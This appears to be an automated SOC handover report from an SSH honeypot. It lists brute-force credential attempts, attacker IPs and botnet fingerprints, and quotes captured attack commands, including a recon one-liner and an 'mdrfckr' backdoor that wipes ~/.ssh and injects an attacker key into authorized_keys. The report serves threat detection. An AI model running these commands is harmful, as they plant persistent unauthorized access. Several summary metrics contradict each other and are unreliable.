# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-09 |
| **Generated At** | 2026-08-09T22:35:46Z |
| **Shift Time** | 22:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **221** |
| Confirmed Threats | **0** |
| False Positives Filtered | **221** (100.0%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **0** |
| High Severity Cases | **145** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **76** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **319** |
| Unique Credential Pairs | **293** |
| Unique Usernames | **20** |
| Unique Passwords | **221** |
| Successful Auth Pairs | **311** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 171 |
| `pi` | 21 |
| `test` | 18 |
| `ubuntu` | 18 |
| `nginx` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 10 |
| `password` | 9 |
| `qwerty` | 7 |
| `letmein` | 7 |
| `123123` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 5 |
| `pi` | `password` | 4 |
| `ubnt` | `1qaz2wsx` | 4 |
| `john` | `john` | 3 |
| `support` | `support` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `qwerty` | `193.32.162.27` | 2026-08-09T18:55:14 |
| `user` | `letmein` | `193.32.162.27` | 2026-08-09T18:56:15 |
| `root` | `Admin654321` | `10.0.0.73` | 2026-08-09T18:56:37 |
| `root` | `qazQAZ123` | `10.0.0.73` | 2026-08-09T18:56:57 |
| `user` | `123123` | `193.32.162.27` | 2026-08-09T18:57:19 |
| `root` | `Passwort1234` | `10.0.0.73` | 2026-08-09T18:58:02 |
| `root` | `Passwort12` | `10.0.0.73` | 2026-08-09T18:58:12 |
| `user` | `123` | `193.32.162.27` | 2026-08-09T18:58:22 |
| `user` | `welcome` | `193.32.162.27` | 2026-08-09T18:59:26 |
| `user` | `user123` | `193.32.162.27` | 2026-08-09T19:00:31 |
| `root` | `Aaaa123.` | `10.0.0.73` | 2026-08-09T19:00:43 |
| `nobody` | `ubuntu` | `10.0.0.73` | 2026-08-09T19:01:01 |
| `user` | `default` | `193.32.162.27` | 2026-08-09T19:01:36 |
| `root` | `Aa@123123` | `10.0.0.73` | 2026-08-09T19:01:42 |
| `root` | `zxc123..` | `10.0.0.73` | 2026-08-09T19:02:18 |
| `root` | `Asd!@#123` | `10.0.0.73` | 2026-08-09T19:02:26 |
| `user` | `account` | `193.32.162.27` | 2026-08-09T19:02:43 |
| `root` | `Passw0rd111` | `10.0.0.73` | 2026-08-09T19:02:46 |
| `root` | `123A123@` | `10.0.0.73` | 2026-08-09T19:03:04 |
| `root` | `qaz123@` | `10.0.0.73` | 2026-08-09T19:03:34 |
| `user` | `member` | `193.32.162.27` | 2026-08-09T19:03:48 |
| `root` | `Ab@123123` | `10.0.0.73` | 2026-08-09T19:03:51 |
| `john` | `john` | `10.0.0.73` | 2026-08-09T19:04:09 |
| `root` | `password3` | `10.0.0.73` | 2026-08-09T19:04:31 |
| `user` | `client` | `193.32.162.27` | 2026-08-09T19:04:52 |
| `root` | `P@55w0rd123!!` | `10.0.0.73` | 2026-08-09T19:05:02 |
| `root` | `123,abc` | `10.0.0.73` | 2026-08-09T19:05:43 |
| `test` | `123456` | `193.32.162.27` | 2026-08-09T19:05:56 |
| `root` | `qweasdzxc123.` | `10.0.0.73` | 2026-08-09T19:06:13 |
| `root` | `Strong123!@#` | `10.0.0.73` | 2026-08-09T19:06:40 |
| `root` | `Command@1` | `10.0.0.73` | 2026-08-09T19:06:54 |
| `test` | `password` | `193.32.162.27` | 2026-08-09T19:07:00 |
| `root` | `abc,.123` | `10.0.0.73` | 2026-08-09T19:07:10 |
| `root` | `Aa123456a` | `10.0.0.73` | 2026-08-09T19:07:42 |
| `root` | `Aa123456aa` | `10.0.0.73` | 2026-08-09T19:07:51 |
| `root` | `Asd123...` | `10.0.0.73` | 2026-08-09T19:08:04 |
| `test` | `test` | `193.32.162.27` | 2026-08-09T19:08:05 |
| `root` | `qwerQWER1234` | `10.0.0.73` | 2026-08-09T19:08:58 |
| `test` | `12345` | `193.32.162.27` | 2026-08-09T19:09:11 |
| `root` | `abcABC!@` | `10.0.0.73` | 2026-08-09T19:09:44 |
| `test` | `123456789` | `193.32.162.27` | 2026-08-09T19:10:17 |
| `root` | `casa` | `24.97.253.246` | 2026-08-09T19:10:17 |
| `root` | `zc1234` | `10.0.0.73` | 2026-08-09T19:11:07 |
| `test` | `passw0rd` | `193.32.162.27` | 2026-08-09T19:11:22 |
| `test` | `12345678` | `193.32.162.27` | 2026-08-09T19:12:27 |
| `root` | `hao123.` | `10.0.0.73` | 2026-08-09T19:12:29 |
| `root` | `abcd1234` | `193.24.211.204` | 2026-08-09T19:12:35 |
| `root` | `123456a#` | `10.0.0.73` | 2026-08-09T19:13:05 |
| `root` | `Abcd234` | `10.0.0.73` | 2026-08-09T19:13:26 |
| `test` | `1234` | `193.32.162.27` | 2026-08-09T19:13:34 |
| `root` | `Abc_123456` | `10.0.0.73` | 2026-08-09T19:13:48 |
| `root` | `qaz123@#` | `10.0.0.73` | 2026-08-09T19:14:06 |
| `support` | `support` | `10.0.0.73` | 2026-08-09T19:14:07 |
| `test` | `qwerty` | `193.32.162.27` | 2026-08-09T19:14:41 |
| `test` | `letmein` | `193.32.162.27` | 2026-08-09T19:15:50 |
| `root` | `123abc@#` | `10.0.0.73` | 2026-08-09T19:15:58 |
| `admin` | `admin` | `157.151.23.70` | 2026-08-09T19:16:47 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-09T19:16:49 |
| `root` | `super!` | `10.0.0.73` | 2026-08-09T19:16:50 |
| `root` | `qaz123$` | `10.0.0.73` | 2026-08-09T19:16:53 |
| `test` | `123123` | `193.32.162.27` | 2026-08-09T19:16:58 |
| `root` | `Admin@321!` | `10.0.0.73` | 2026-08-09T19:17:09 |
| `root` | `Aa!123.` | `10.0.0.73` | 2026-08-09T19:17:24 |
| `test` | `123` | `193.32.162.27` | 2026-08-09T19:18:06 |
| `root` | `ZXCasd123456` | `10.0.0.73` | 2026-08-09T19:18:06 |
| `root` | `Vietnam@123123` | `10.0.0.73` | 2026-08-09T19:18:19 |
| `root` | `System$1` | `10.0.0.73` | 2026-08-09T19:18:34 |
| `test` | `testing` | `193.32.162.27` | 2026-08-09T19:19:13 |
| `nobody` | `ubuntu` | `85.152.57.60` | 2026-08-09T19:19:43 |
| `root` | `s3rv3r.321` | `10.0.0.73` | 2026-08-09T19:19:50 |
| `test` | `test123` | `193.32.162.27` | 2026-08-09T19:20:20 |
| `root` | `123@4rfv` | `10.0.0.73` | 2026-08-09T19:20:24 |
| `john` | `john` | `65.20.149.239` | 2026-08-09T19:21:17 |
| `test` | `demo` | `193.32.162.27` | 2026-08-09T19:21:27 |
| `john` | `john` | `106.112.194.160` | 2026-08-09T19:21:32 |
| `root` | `123@QWEA` | `10.0.0.73` | 2026-08-09T19:21:39 |
| `test` | `access` | `193.32.162.27` | 2026-08-09T19:22:31 |
| `root` | `﻿------fuck------` | `183.247.202.167` | 2026-08-09T19:22:31 |
| `root` | `123@WSX` | `10.0.0.73` | 2026-08-09T19:22:44 |
| `root` | `123@ZXC@123` | `10.0.0.73` | 2026-08-09T19:22:50 |
| `test` | `temp` | `193.32.162.27` | 2026-08-09T19:23:35 |
| `root` | `123@asd@QWE` | `10.0.0.73` | 2026-08-09T19:24:08 |
| `test` | `trial` | `193.32.162.27` | 2026-08-09T19:24:39 |
| `root` | `123@zxc@123` | `10.0.0.73` | 2026-08-09T19:25:09 |
| `root` | `123@zxc@ASD` | `10.0.0.73` | 2026-08-09T19:25:17 |
| `ubuntu` | `ubuntu` | `193.32.162.27` | 2026-08-09T19:25:45 |
| `supervisor` | `supervisor123456` | `10.0.0.73` | 2026-08-09T19:26:32 |
| `pi` | `password` | `59.120.8.61` | 2026-08-09T19:26:51 |
| `ubuntu` | `password` | `193.32.162.27` | 2026-08-09T19:26:55 |
| `root` | `!Pass1234` | `10.0.0.73` | 2026-08-09T19:27:07 |
| `root` | `Redhat@!@` | `10.0.0.73` | 2026-08-09T19:27:23 |
| `root` | `Control1` | `10.0.0.73` | 2026-08-09T19:27:53 |
| `ubuntu` | `123456` | `193.32.162.27` | 2026-08-09T19:28:04 |
| `supervisor` | `supervisor123456` | `76.132.238.43` | 2026-08-09T19:28:16 |
| `root` | `2qaz!QAZ` | `10.0.0.73` | 2026-08-09T19:28:58 |
| `root` | `Asd@` | `10.0.0.73` | 2026-08-09T19:29:01 |
| `ubuntu` | `12345` | `193.32.162.27` | 2026-08-09T19:29:09 |
| `ubuntu` | `123456789` | `193.32.162.27` | 2026-08-09T19:30:11 |
| `ubuntu` | `passw0rd` | `193.32.162.27` | 2026-08-09T19:31:09 |
| `ubuntu` | `12345678` | `193.32.162.27` | 2026-08-09T19:32:07 |
| `ubuntu` | `1234` | `193.32.162.27` | 2026-08-09T19:33:10 |
| `ubuntu` | `qwerty` | `193.32.162.27` | 2026-08-09T19:34:05 |
| `ubuntu` | `letmein` | `193.32.162.27` | 2026-08-09T19:35:07 |
| `ubuntu` | `123123` | `193.32.162.27` | 2026-08-09T19:36:08 |
| `ubuntu` | `123` | `193.32.162.27` | 2026-08-09T19:37:08 |
| `ubuntu` | `server` | `193.32.162.27` | 2026-08-09T19:38:07 |
| `pi` | `password` | `10.0.0.73` | 2026-08-09T19:38:20 |
| `ubuntu` | `default` | `193.32.162.27` | 2026-08-09T19:39:08 |
| `ubuntu` | `admin` | `193.32.162.27` | 2026-08-09T19:40:09 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-09T19:40:10 |
| `root` | `123@@@` | `168.110.102.254` | 2026-08-09T19:40:14 |
| `ubuntu` | `ubuntu123` | `193.32.162.27` | 2026-08-09T19:41:11 |
| `ubuntu` | `cloud` | `193.32.162.27` | 2026-08-09T19:42:11 |
| `ubuntu` | `login` | `193.32.162.27` | 2026-08-09T19:43:11 |
| `pi` | `raspberry` | `193.32.162.27` | 2026-08-09T19:44:11 |
| `pi` | `password` | `193.32.162.27` | 2026-08-09T19:45:11 |
| `pi` | `123456` | `193.32.162.27` | 2026-08-09T19:46:11 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-09T19:46:53 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-09T19:46:53 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.211.77` | 2026-08-09T19:46:54 |
| `pi` | `12345` | `193.32.162.27` | 2026-08-09T19:47:11 |
| `pi` | `123456789` | `193.32.162.27` | 2026-08-09T19:48:10 |
| `root` | `@!123Ppass` | `10.0.0.73` | 2026-08-09T19:49:09 |
| `pi` | `passw0rd` | `193.32.162.27` | 2026-08-09T19:49:11 |
| `root` | `A123@123` | `10.0.0.73` | 2026-08-09T19:49:40 |
| `root` | `usertest123` | `10.0.0.73` | 2026-08-09T19:49:50 |
| `pi` | `12345678` | `193.32.162.27` | 2026-08-09T19:50:10 |
| `root` | `QW.12` | `10.0.0.73` | 2026-08-09T19:51:02 |
| `root` | `12.QW` | `10.0.0.73` | 2026-08-09T19:51:08 |
| `pi` | `1234` | `193.32.162.27` | 2026-08-09T19:51:10 |
| `pi` | `qwerty` | `193.32.162.27` | 2026-08-09T19:52:10 |
| `root` | `!QAZs` | `10.0.0.73` | 2026-08-09T19:52:47 |
| `root` | `p@1234` | `10.0.0.73` | 2026-08-09T19:53:11 |
| `pi` | `letmein` | `193.32.162.27` | 2026-08-09T19:53:13 |
| `root` | `!!qq22!!` | `10.0.0.73` | 2026-08-09T19:53:16 |
| `supervisor` | `1234` | `49.124.149.213` | 2026-08-09T19:53:38 |
| `root` | `Pa$$w0rd.7` | `10.0.0.73` | 2026-08-09T19:53:45 |
| `support` | `support` | `176.53.159.196` | 2026-08-09T19:54:05 |
| `root` | `zaq@123` | `10.0.0.73` | 2026-08-09T19:54:07 |
| `pi` | `123123` | `193.32.162.27` | 2026-08-09T19:54:13 |
| `root` | `vm4321` | `10.0.0.73` | 2026-08-09T19:54:36 |
| `root` | `data@center` | `10.0.0.73` | 2026-08-09T19:54:57 |
| `pi` | `123` | `193.32.162.27` | 2026-08-09T19:55:13 |
| `root` | `123ZXC_123` | `10.0.0.73` | 2026-08-09T19:55:37 |
| `pi` | `raspberrypi` | `193.32.162.27` | 2026-08-09T19:56:15 |
| `admin` | `admin` | `198.98.53.110` | 2026-08-09T19:56:24 |
| `pi` | `pihole` | `193.32.162.27` | 2026-08-09T19:57:14 |
| `root` | `Bfed3adfz4d` | `10.0.0.73` | 2026-08-09T19:57:24 |
| `root` | `Ali321` | `10.0.0.73` | 2026-08-09T19:57:41 |
| `pi` | `admin` | `193.32.162.27` | 2026-08-09T19:58:12 |
| `root` | `Access1234` | `10.0.0.73` | 2026-08-09T19:58:29 |
| `root` | `blood321` | `10.0.0.73` | 2026-08-09T19:58:48 |
| `pi` | `default` | `193.32.162.27` | 2026-08-09T19:59:15 |
| `root` | `123Setup` | `10.0.0.73` | 2026-08-09T19:59:24 |
| `root` | `!QAZXCV` | `10.0.0.73` | 2026-08-09T19:59:38 |
| `pi` | `retropie` | `193.32.162.27` | 2026-08-09T20:00:19 |
| `root` | `Tech123` | `10.0.0.73` | 2026-08-09T20:00:54 |
| `root` | `123` | `10.0.0.73` | 2026-08-09T20:01:02 |
| `pi` | `berry` | `193.32.162.27` | 2026-08-09T20:01:19 |
| `nginx` | `nginx` | `193.32.162.27` | 2026-08-09T20:02:21 |
| `root` | `vps@1234` | `10.0.0.73` | 2026-08-09T20:02:31 |
| `nginx` | `password` | `193.32.162.27` | 2026-08-09T20:03:22 |
| `root` | `10Password123` | `10.0.0.73` | 2026-08-09T20:04:10 |
| `nginx` | `123456` | `193.32.162.27` | 2026-08-09T20:04:25 |
| `root` | `123Vps` | `10.0.0.73` | 2026-08-09T20:04:40 |
| `root` | `@Calory123` | `10.0.0.73` | 2026-08-09T20:04:56 |
| `root` | `@lua4296` | `10.0.0.73` | 2026-08-09T20:05:05 |
| `nginx` | `12345` | `193.32.162.27` | 2026-08-09T20:05:25 |
| `root` | `admin123@*` | `10.0.0.73` | 2026-08-09T20:05:55 |
| `root` | `admin1234*` | `10.0.0.73` | 2026-08-09T20:06:07 |
| `root` | `administrativo1*` | `10.0.0.73` | 2026-08-09T20:06:24 |
| `nginx` | `123456789` | `193.32.162.27` | 2026-08-09T20:06:27 |
| `root` | `C$Tecnologia` | `10.0.0.73` | 2026-08-09T20:06:55 |
| `root` | `Computer1234` | `10.0.0.73` | 2026-08-09T20:07:11 |
| `nginx` | `passw0rd` | `193.32.162.27` | 2026-08-09T20:07:28 |
| `root` | `Gsempre6979` | `10.0.0.73` | 2026-08-09T20:07:41 |
| `root` | `Operator123` | `10.0.0.73` | 2026-08-09T20:08:17 |
| `nginx` | `12345678` | `193.32.162.27` | 2026-08-09T20:08:30 |
| `root` | `Remote1` | `10.0.0.73` | 2026-08-09T20:08:56 |
| `root` | `Sabre763` | `10.0.0.73` | 2026-08-09T20:09:09 |
| `Test` | `654321` | `10.0.0.73` | 2026-08-09T20:09:19 |
| `root` | `Sales123` | `10.0.0.73` | 2026-08-09T20:09:20 |
| `nginx` | `1234` | `193.32.162.27` | 2026-08-09T20:09:29 |
| `root` | `Shop1` | `10.0.0.73` | 2026-08-09T20:09:54 |
| `root` | `sistec@5660` | `10.0.0.73` | 2026-08-09T20:10:00 |
| `nginx` | `qwerty` | `193.32.162.27` | 2026-08-09T20:10:30 |
| `root` | `123kkk` | `10.0.0.73` | 2026-08-09T20:11:16 |
| `nginx` | `letmein` | `193.32.162.27` | 2026-08-09T20:11:30 |
| `root` | `boss123` | `10.0.0.73` | 2026-08-09T20:12:00 |
| `centos` | `centos0` | `10.0.0.73` | 2026-08-09T20:12:23 |
| `nginx` | `123123` | `193.32.162.27` | 2026-08-09T20:12:32 |
| `nginx` | `123` | `193.32.162.27` | 2026-08-09T20:13:35 |
| `root` | `john123` | `10.0.0.73` | 2026-08-09T20:13:45 |
| `root` | `3admin` | `10.0.0.73` | 2026-08-09T20:13:54 |
| `nginx` | `admin` | `193.32.162.27` | 2026-08-09T20:14:38 |
| `root` | `fr33d0m` | `10.0.0.73` | 2026-08-09T20:15:04 |
| `nginx` | `web` | `193.32.162.27` | 2026-08-09T20:15:39 |
| `root` | `1q2w3e4r5t6y7u8` | `10.0.0.73` | 2026-08-09T20:15:45 |
| `nginx` | `server` | `193.32.162.27` | 2026-08-09T20:16:39 |
| `nginx` | `proxy` | `193.32.162.27` | 2026-08-09T20:17:41 |
| `root` | `ASD#123` | `10.0.0.73` | 2026-08-09T20:18:07 |
| `root` | `ASD%123` | `10.0.0.73` | 2026-08-09T20:18:13 |
| `nginx` | `http` | `193.32.162.27` | 2026-08-09T20:18:43 |
| `root` | `Welcome8` | `10.0.0.73` | 2026-08-09T20:18:46 |
| `root` | `ADM1N122` | `10.0.0.73` | 2026-08-09T20:18:50 |
| `root` | `@WSXZAQ!` | `10.0.0.73` | 2026-08-09T20:19:14 |
| `root` | `123456@Ab` | `10.0.0.73` | 2026-08-09T20:19:27 |
| `root` | `12345678@Ab` | `10.0.0.73` | 2026-08-09T20:19:31 |
| `root` | `123456789@Ab` | `10.0.0.73` | 2026-08-09T20:19:37 |
| `nginx` | `config` | `193.32.162.27` | 2026-08-09T20:19:44 |
| `root` | `Zxcv123` | `10.0.0.73` | 2026-08-09T20:19:45 |
| `root` | `Backup11` | `10.0.0.73` | 2026-08-09T20:20:25 |
| `apache` | `apache` | `193.32.162.27` | 2026-08-09T20:20:45 |
| `root` | `Admin@0001` | `10.0.0.73` | 2026-08-09T20:21:22 |
| `root` | `Admin@WSX1` | `10.0.0.73` | 2026-08-09T20:21:28 |
| `apache` | `password` | `193.32.162.27` | 2026-08-09T20:21:46 |
| `root` | `admin21` | `10.0.0.73` | 2026-08-09T20:22:10 |
| `root` | `qwertz321` | `10.0.0.73` | 2026-08-09T20:22:18 |
| `apache` | `123456` | `193.32.162.27` | 2026-08-09T20:22:48 |
| `root` | `Pass_word` | `10.0.0.73` | 2026-08-09T20:23:29 |
| `apache` | `12345` | `193.32.162.27` | 2026-08-09T20:23:51 |
| `root` | `Configit123` | `10.0.0.73` | 2026-08-09T20:24:09 |
| `root` | `password4` | `10.0.0.73` | 2026-08-09T20:24:23 |
| `apache` | `123456789` | `193.32.162.27` | 2026-08-09T20:24:55 |
| `apache` | `passw0rd` | `193.32.162.27` | 2026-08-09T20:26:01 |
| `root` | `vps@@##11` | `10.0.0.73` | 2026-08-09T20:26:11 |
| `root` | `vps1024` | `10.0.0.73` | 2026-08-09T20:26:52 |
| `apache` | `12345678` | `193.32.162.27` | 2026-08-09T20:27:08 |
| `Test` | `654321` | `65.20.204.88` | 2026-08-09T20:27:47 |
| `root` | `luke01` | `10.0.0.73` | 2026-08-09T20:28:03 |
| `apache` | `1234` | `193.32.162.27` | 2026-08-09T20:28:14 |
| `root` | `Password88` | `10.0.0.73` | 2026-08-09T20:29:00 |
| `apache` | `qwerty` | `193.32.162.27` | 2026-08-09T20:29:22 |
| `root` | `Germany1` | `10.0.0.73` | 2026-08-09T20:29:23 |
| `root` | `Admin.321456` | `10.0.0.73` | 2026-08-09T20:29:40 |
| `root` | `m@ster` | `10.0.0.73` | 2026-08-09T20:30:06 |
| `apache` | `letmein` | `193.32.162.27` | 2026-08-09T20:30:30 |
| `root` | `administrat0r88` | `10.0.0.73` | 2026-08-09T20:30:53 |
| `root` | `Micros1` | `10.0.0.73` | 2026-08-09T20:31:04 |
| `apache` | `123123` | `193.32.162.27` | 2026-08-09T20:31:39 |
| `root` | `Admin@3` | `10.0.0.73` | 2026-08-09T20:31:53 |
| `root` | `account1` | `10.0.0.73` | 2026-08-09T20:32:13 |
| `apache` | `123` | `193.32.162.27` | 2026-08-09T20:32:47 |
| `root` | `@dMIN1` | `10.0.0.73` | 2026-08-09T20:32:56 |
| `apache` | `admin` | `193.32.162.27` | 2026-08-09T20:33:57 |
| `root` | `@dm1n88` | `10.0.0.73` | 2026-08-09T20:34:37 |
| `ts3server` | `12345` | `51.75.253.68` | 2026-08-09T20:35:05 |
| `admin` | `aerohive` | `111.70.23.240` | 2026-08-09T20:35:08 |
| `345gs5662d34` | `345gs5662d34` | `51.75.253.68` | 2026-08-09T20:35:08 |
| `ts3server` | `3245gs5662d34` | `51.75.253.68` | 2026-08-09T20:35:08 |
| `ubnt` | `1qaz2wsx` | `10.0.0.73` | 2026-08-09T20:35:09 |
| `apache` | `server` | `193.32.162.27` | 2026-08-09T20:35:09 |
| `root` | `@dministrador` | `10.0.0.73` | 2026-08-09T20:35:14 |
| `admin` | `aerohive` | `65.20.233.110` | 2026-08-09T20:35:15 |
| `root` | `ADM1N` | `10.0.0.73` | 2026-08-09T20:35:28 |
| `root` | `ADM1N1STRATOR22` | `10.0.0.73` | 2026-08-09T20:36:06 |
| `root` | `ADMINISTR@TOR0` | `10.0.0.73` | 2026-08-09T20:36:24 |
| `apache` | `httpd` | `193.32.162.27` | 2026-08-09T20:36:24 |
| `root` | `ADMINISTRATEUR!` | `10.0.0.73` | 2026-08-09T20:36:36 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-09T20:36:38 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-09T20:36:38 |
| `ubnt` | `1qaz2wsx` | `101.13.4.124` | 2026-08-09T20:36:54 |
| `root` | `ADMINISTRATOR1234` | `10.0.0.73` | 2026-08-09T20:37:02 |
| `apache` | `tomcat` | `193.32.162.27` | 2026-08-09T20:37:29 |
| `root` | `Adm1n1234` | `10.0.0.73` | 2026-08-09T20:38:06 |
| `root` | `Adm1n1str@t0r!.` | `10.0.0.73` | 2026-08-09T20:38:12 |
| `apache` | `localhost` | `193.32.162.27` | 2026-08-09T20:38:27 |
| `root` | `Adm1n33` | `10.0.0.73` | 2026-08-09T20:39:00 |
| `root` | `Adm1n@` | `10.0.0.73` | 2026-08-09T20:39:13 |
| `apache` | `www` | `193.32.162.27` | 2026-08-09T20:39:28 |
| `root` | `Admin#567432` | `10.0.0.73` | 2026-08-09T20:40:11 |
| `git` | `git` | `193.32.162.27` | 2026-08-09T20:40:29 |
| `root` | `Admin.!@#` | `10.0.0.73` | 2026-08-09T20:40:31 |
| `root` | `Admin.789765` | `10.0.0.73` | 2026-08-09T20:41:08 |
| `git` | `password` | `193.32.162.27` | 2026-08-09T20:41:29 |
| `git` | `123456` | `193.32.162.27` | 2026-08-09T20:42:30 |
| `root` | `Admin@123890` | `10.0.0.73` | 2026-08-09T20:43:14 |
| `debian` | `123` | `10.0.0.73` | 2026-08-09T20:43:22 |
| `git` | `12345` | `193.32.162.27` | 2026-08-09T20:43:34 |
| `git` | `123456789` | `193.32.162.27` | 2026-08-09T20:44:39 |
| `root` | `m0nkey123` | `10.0.0.73` | 2026-08-09T20:44:55 |
| `root` | `gem123` | `10.0.0.73` | 2026-08-09T20:45:16 |
| `git` | `passw0rd` | `193.32.162.27` | 2026-08-09T20:45:46 |
| `root` | `baseball123` | `10.0.0.73` | 2026-08-09T20:45:51 |
| `root` | `senat0r` | `10.0.0.73` | 2026-08-09T20:46:31 |
| `git` | `12345678` | `193.32.162.27` | 2026-08-09T20:46:49 |
| `git` | `1234` | `193.32.162.27` | 2026-08-09T20:47:50 |
| `root` | `genesis123` | `10.0.0.73` | 2026-08-09T20:47:56 |
| `root` | `M@n@ger` | `10.0.0.73` | 2026-08-09T20:48:24 |
| `root` | `drag0n` | `10.0.0.73` | 2026-08-09T20:48:27 |
| `git` | `qwerty` | `193.32.162.27` | 2026-08-09T20:48:52 |
| `root` | `stephen123` | `10.0.0.73` | 2026-08-09T20:48:58 |
| `root` | `david123` | `10.0.0.73` | 2026-08-09T20:49:05 |
| `root` | `j@son` | `10.0.0.73` | 2026-08-09T20:49:22 |
| `root` | `c0mputer123` | `10.0.0.73` | 2026-08-09T20:49:41 |
| `git` | `letmein` | `193.32.162.27` | 2026-08-09T20:49:56 |
| `root` | `att123` | `10.0.0.73` | 2026-08-09T20:50:00 |
| `root` | `@ccount` | `10.0.0.73` | 2026-08-09T20:50:58 |
| `git` | `123123` | `193.32.162.27` | 2026-08-09T20:51:00 |
| `root` | `br0ken` | `10.0.0.73` | 2026-08-09T20:51:12 |
| `root` | `god@ddy` | `10.0.0.73` | 2026-08-09T20:51:41 |
| `git` | `123` | `193.32.162.27` | 2026-08-09T20:52:02 |
| `root` | `@nim@ls123` | `10.0.0.73` | 2026-08-09T20:52:20 |
| `root` | `bridge123` | `10.0.0.73` | 2026-08-09T20:52:36 |
| `root` | `summer123` | `10.0.0.73` | 2026-08-09T20:53:03 |
| `git` | `github` | `193.32.162.27` | 2026-08-09T20:53:04 |
| `ubnt` | `1qaz2wsx` | `196.188.187.205` | 2026-08-09T20:53:13 |
| `ubnt` | `1qaz2wsx` | `196.188.93.169` | 2026-08-09T20:53:20 |
| `root` | `south123` | `10.0.0.73` | 2026-08-09T20:53:21 |
| `root` | `fucky0u` | `10.0.0.73` | 2026-08-09T20:53:40 |
| `git` | `gitlab` | `193.32.162.27` | 2026-08-09T20:54:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **221** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 121 |
| OpenSSH | 15 |
| libssh | 11 |
| Paramiko (Python) | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 114 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 15 | 15 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 2 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 114 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 15 | 15 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 114 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.27`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `51.75.253.68`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **60** |
